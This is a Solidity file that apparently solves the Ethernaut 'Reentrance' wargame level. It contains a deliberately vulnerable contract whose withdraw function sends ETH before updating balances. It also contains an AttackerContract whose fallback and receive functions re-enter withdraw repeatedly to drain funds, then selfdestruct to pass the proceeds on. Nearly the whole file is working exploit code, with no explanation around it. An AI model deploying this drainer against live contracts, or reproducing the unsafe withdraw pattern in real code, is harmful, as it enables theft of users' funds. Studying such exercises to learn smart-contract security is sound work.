// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol";

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

contract AttackerContract {

    Reentrance public reentrance;
    uint256 public attackCount;
    
    constructor(address payable _reentranceAddress) public payable {
        reentrance = Reentrance(_reentranceAddress);
    }
    
    fallback() external payable {
        if(attackCount < 10) {
            attackCount++;
            reentrance.withdraw(100000000000000);
        }
    }
    receive() external payable {
        if(attackCount < 10) {
            attackCount++;
            reentrance.withdraw(100000000000000);
        }
    }
    
    // 返回合约ETH余额
    function getBalance() view public returns(uint) {
        return address(this).balance;
    }
    function withdraw(address payable _to) external payable{
      selfdestruct(_to);
    }
    
    function sendETH(uint256 _amount) external {
        // 发送以太币交易并调用目标函数
        reentrance.donate{value: _amount}(address(this));
    }
    function attack() public payable {
        attackCount = 0;
        reentrance.withdraw(100000000000000);
    }
    function callWithdraw() public payable{
        reentrance.withdraw(100000000000000);
    }
}